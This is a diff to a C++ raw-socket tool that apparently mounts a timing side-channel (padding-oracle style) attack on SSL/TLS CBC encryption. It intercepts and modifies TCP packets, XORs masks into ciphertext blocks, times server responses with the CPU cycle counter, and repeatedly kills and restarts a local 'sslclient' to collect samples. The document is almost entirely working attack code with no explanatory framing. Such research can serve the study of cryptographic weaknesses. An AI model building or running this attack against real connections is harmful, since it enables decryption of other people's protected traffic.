@@ -1,5 +1,6 @@
 #include <iostream>
 #include <cstring>
+#include <cstdlib>
 #include <netinet/udp.h>
 #include <netinet/tcp.h>
 #include <netinet/ip.h>
@@ -7,21 +8,33 @@
 #include <arpa/inet.h>
 #include <sys/ioctl.h>
 #include <net/if.h>
+#include <map>
+#include <list>
+
+#include <x86intrin.h>
 
 bool firstPhase = true;
 bool waitRes = false;
 bool packetSent = false;
 bool sendAck = false;
+bool doReset = false;
+bool killClient = false;
 unsigned char * xorMask;
 unsigned char * plaintext;
 
 const int blockSize = 16;
 int blockOffset = blockSize - 2;
+int samples = 1;
 
 int sock_raw;
 struct sockaddr_in sin;
 
 unsigned int lastTS = 0;
+
+std::map<unsigned short,std::list<uint64_t> > maskCycles;
+
+uint64_t sendCycle;
+uint64_t recvCycle;
 
 void ProcessPacket(unsigned char * data, int size);
 
@@ -173,6 +186,73 @@ void SendAck(unsigned char * toPacket, int toSize, unsigned char * fromPacket, i
 
 int skipPackets = 0;
 
+void ResetState()
+{
+	waitRes = false;
+	packetSent = false;
+	sendAck = false;
+	doReset = false;
+	killClient = false;
+	skipPackets = 9;
+}
+
+void KillClient()
+{
+	system("killall -9 sslclient");	
+}
+
+void RestartClient()
+{
+	system("./sslclient &");
+}
+
+void ProcessStats()
+{
+	if(true)
+	{
+		// Print stats
+		for(std::map<unsigned short,std::list<uint64_t> >::iterator it = maskCycles.begin(); it != maskCycles.end(); ++it)
+		{
+			std::cerr << "Mask: " << std::hex << it->first << std::dec << std::endl;
+			for(std::list<uint64_t>::iterator lit = it->second.begin(); lit != it->second.end(); ++lit)
+			{
+				std::cerr << "Sample: " << (*lit) << std::endl;
+			}
+		}
+	}
+	maskCycles.clear();
+	exit(1);
+}
+
+void ProcessCycles()
+{
+	uint64_t diff = recvCycle - sendCycle;
+	std::cerr << "Cycle count: " << diff << std::endl;	
+
+	unsigned short mask = 0;
+	if(firstPhase)
+	{
+		mask = *((unsigned short*)&xorMask[blockSize-2]);
+	}
+
+	maskCycles[mask].push_back(diff);
+	if(maskCycles[mask].size() >= samples)
+	{
+		// change mask
+		if(firstPhase)
+		{
+			// for now increment both, since it should be padding
+			xorMask[blockOffset]++;
+			xorMask[blockOffset+1]++;
+		}
+
+		if(xorMask[blockOffset] == 0)
+		{
+			ProcessStats();
+		}
+	}
+}
+
 int main(int argc, char ** argv)
 {
 	xorMask = new unsigned char[blockSize];
@@ -183,6 +263,8 @@ int main(int argc, char ** argv)
 
 	xorMask[blockSize-1] = 0x00;
 	xorMask[blockSize-2] = 0x00;
+
+	ResetState();
 
 	socklen_t saddr_size;
 	int data_size;
@@ -224,17 +306,38 @@ int main(int argc, char ** argv)
 		{
 			unsigned int tsize = 0;
                         tsize = recvfrom(sock_raw,tempBuffer,65536,0,&saddr,&saddr_size);
-			std::cerr << "Skipping packet of size: " << tsize << std::endl;
+			//std::cerr << "Skipping packet of size: " << tsize << std::endl;
 			skipPackets--;
 			continue;
 		}
 	
-		if(sendAck)
+		if(doReset)
 		{
 			unsigned int tsize = 0;
                         tsize = recvfrom(sock_raw,tempBuffer,65536,0,&saddr,&saddr_size);
-                        std::cerr << "Ack packet of size: " << tsize << std::endl;
+                        //std::cerr << "Should Reset packet of size: " << tsize << std::endl;
+			ResetState();
+			RestartClient();
+
+			continue;
+		}
+		else if(killClient)
+		{
+			unsigned int tsize = 0;
+                        tsize = recvfrom(sock_raw,tempBuffer,65536,0,&saddr,&saddr_size);
+                        //std::cerr << "Should kill client packet of size: " << tsize << std::endl;
+			KillClient();
+			skipPackets = 1;
+			doReset = true;
+			continue;
+		}
+		else if(sendAck)
+		{
+			unsigned int tsize = 0;
+                        tsize = recvfrom(sock_raw,tempBuffer,65536,0,&saddr,&saddr_size);
+                        //std::cerr << "Ack packet of size: " << tsize << std::endl;
 			sendAck = false;
+			killClient = true;
 			SendAck(buffer,data_size,tempBuffer,tsize);
 			continue;
 		}
@@ -242,24 +345,26 @@ int main(int argc, char ** argv)
 		{
 			unsigned int tsize = 0;
 			tsize = recvfrom(sock_raw,tempBuffer,65536,0,&saddr,&saddr_size);
-			std::cerr << "Got PackRes packet size: " << data_size << std::endl;
+			recvCycle = __rdtsc();
+			//std::cerr << "Got PackRes packet size: " << data_size << std::endl;
 			skipPackets = 1;
 			sendAck = true;
+			ProcessCycles();
 			continue;
 		}
 		else if(!waitRes)
 		{
 			data_size = recvfrom(sock_raw,buffer,65536,0,&saddr,&saddr_size);
 			waitRes = true;
-			std::cerr << "Wait for res" << std::endl;
-			std::cerr << "Got packet size: " << data_size << std::endl;
+			//std::cerr << "Wait for res" << std::endl;
+			//std::cerr << "Got packet size: " << data_size << std::endl;
 			continue;
 		}
 		else
 		{
 			unsigned int tsize = 0;
 			tsize = recvfrom(sock_raw,tempBuffer,65536,0,&saddr,&saddr_size);
-			std::cerr << "Got res packet size: " << tsize  << std::endl;
+			//std::cerr << "Got res packet size: " << tsize  << std::endl;
 			waitRes = false;
 			setReadTimestamp(tempBuffer,tsize);
 		}
@@ -279,6 +384,7 @@ int main(int argc, char ** argv)
 
 void SendPacket(unsigned char * data, int size)
 {
+	sendCycle = __rdtsc();
 	if(sendto(sock_raw,data,size,0,(struct sockaddr*)&sin,sizeof(struct sockaddr)) < 0)  
 	{
 		std::cerr << "Error sending packet." << std::endl;
@@ -292,7 +398,7 @@ void PrintTCPOptions(unsigned char * data, int len)
 	int index = 0;
 	while(data[index] != 0 && index < len)
 	{
-		std::cerr << "Option id: " << (unsigned int)data[index] << std::endl;
+		//std::cerr << "Option id: " << (unsigned int)data[index] << std::endl;
 		switch(data[index])
 		{
 			case 0:
@@ -316,7 +422,7 @@ void PrintTCPOptions(unsigned char * data, int len)
 			{
 				unsigned int tstmp = ntohl(*((unsigned int*)&data[index+2]));
 				unsigned int ecr = ntohl(*((unsigned int*)&data[index+6]));
-				std::cerr << "TS: 1: " << (unsigned int)data[index+1] << " TS: " << tstmp << " ER: " << ecr << std::endl;
+				//std::cerr << "TS: 1: " << (unsigned int)data[index+1] << " TS: " << tstmp << " ER: " << ecr << std::endl;
 				index += 10;
 				break;
 			}
@@ -332,7 +438,7 @@ void UpdateTCPOptions(unsigned char * data, int len)
         int index = 0;
         while(data[index] != 0 && index < len)
         {
-                std::cerr << "Option id: " << (unsigned int)data[index] << std::endl;
+                //std::cerr << "Option id: " << (unsigned int)data[index] << std::endl;
                 switch(data[index])
                 {
                         case 0:
@@ -359,7 +465,7 @@ void UpdateTCPOptions(unsigned char * data, int len)
 				*((unsigned int*)&data[index+6]) = htonl(lastTS);
 				tstmp = ntohl(*((unsigned int*)&data[index+2]));
                                 unsigned int ecr = ntohl(*((unsigned int*)&data[index+6]));
-                                std::cerr << "TS: 1: " << (unsigned int)data[index+1] << " TS: " << tstmp << " ER: " << ecr << std::endl;
+                                //std::cerr << "TS: 1: " << (unsigned int)data[index+1] << " TS: " << tstmp << " ER: " << ecr << std::endl;
                                 index += 10;
                                 break;
                         }
@@ -385,7 +491,7 @@ void setReadTimestamp(unsigned char * data, int len)
 		int index = 0;
 		while(options[index] != 0 && index < optlen)
 		{
-			std::cerr << "Option id: " << (unsigned int)options[index] << std::endl;
+			//std::cerr << "Option id: " << (unsigned int)options[index] << std::endl;
 			switch(options[index])
 			{
 				case 0:
@@ -409,10 +515,10 @@ void setReadTimestamp(unsigned char * data, int len)
 					{
 						unsigned int tstmp = ntohl(*((unsigned int*)&options[index+2]));
 						unsigned int ecr = ntohl(*((unsigned int*)&options[index+6]));
-						std::cerr << "TS: 1: " << (unsigned int)options[index+1] << " TS: " << tstmp << " ER: " << ecr << std::endl;
+						//std::cerr << "TS: 1: " << (unsigned int)options[index+1] << " TS: " << tstmp << " ER: " << ecr << std::endl;
 						index += 10;
 						lastTS = tstmp;
-						std::cerr << "LastTS: " << lastTS << std::endl;
+						//std::cerr << "LastTS: " << lastTS << std::endl;
 						break;
 					}
 				default:
@@ -456,7 +562,7 @@ void SendAck(unsigned char * toPacket, int toSize, unsigned char * fromPacket, i
         {
                 std::cerr << "Error sending packet." << std::endl;
         }
-	std::cerr << "Ack sent" << std::endl;
+	//std::cerr << "Ack sent" << std::endl;
 }
 
 void ProcessPacket(unsigned char * data, int size)
@@ -464,16 +570,16 @@ void ProcessPacket(unsigned char * data, int size)
 	struct iphdr * iph = (struct iphdr*)data;
 	if(iph->protocol == 6)
 	{
-		std::cerr << "Got TCP packet" << std::endl;
+		//std::cerr << "Got TCP packet" << std::endl;
 		unsigned short iphdrlen;
 		iphdrlen = iph->ihl*4;
 
 		struct ip * ciph = (struct ip*)data;
 
 		struct tcphdr * tcph = (struct tcphdr*)(data + iphdrlen);
-		std::cerr << "Data payload size: " << (size - tcph->doff*4 - iphdrlen) << std::endl;
-		std::cerr << "Data offset: " << (int)tcph->th_off << std::endl;
-		std::cerr << "Old ck: " << (unsigned int)ciph->ip_sum << std::endl;
+		//std::cerr << "Data payload size: " << (size - tcph->doff*4 - iphdrlen) << std::endl;
+		//std::cerr << "Data offset: " << (int)tcph->th_off << std::endl;
+		//std::cerr << "Old ck: " << (unsigned int)ciph->ip_sum << std::endl;
 		ciph->ip_sum = 0;
 
 		unsigned char * payload = data + iphdrlen + tcph->doff*4;
@@ -482,15 +588,15 @@ void ProcessPacket(unsigned char * data, int size)
 		unsigned char * optional = ((unsigned char*)tcph)+20;
 		int optlen = (tcph->th_off-5)*4;
 
-		std::cerr << "recalc: " << (unsigned int)checksum((uint16_t*)ciph,iphdrlen) << std::endl;
-		std::cerr << "Old tcp: " << (unsigned int)tcph->th_sum << std::endl;
-		std::cerr << "Recalc: " << (unsigned int)tcp4_checksum(*ciph,*tcph,payload,payloadSize,optional,optlen) << std::endl;
+		//std::cerr << "recalc: " << (unsigned int)checksum((uint16_t*)ciph,iphdrlen) << std::endl;
+		//std::cerr << "Old tcp: " << (unsigned int)tcph->th_sum << std::endl;
+		//std::cerr << "Recalc: " << (unsigned int)tcp4_checksum(*ciph,*tcph,payload,payloadSize,optional,optlen) << std::endl;
 
 		//PrintTCPOptions(((unsigned char*)tcph)+20,(tcph->th_off-5)*4);
 		UpdateTCPOptions(((unsigned char*)tcph)+20,(tcph->th_off-5)*4);
 
 		int blocks = (payloadSize - 5) / blockSize;
-		std::cerr << "Blocks: " << blocks << std::endl;
+		//std::cerr << "Blocks: " << blocks << std::endl;
 
 		unsigned char * blkptr = payload + 5 + blockSize * (blocks - 2);
 		xorData(blkptr,xorMask);
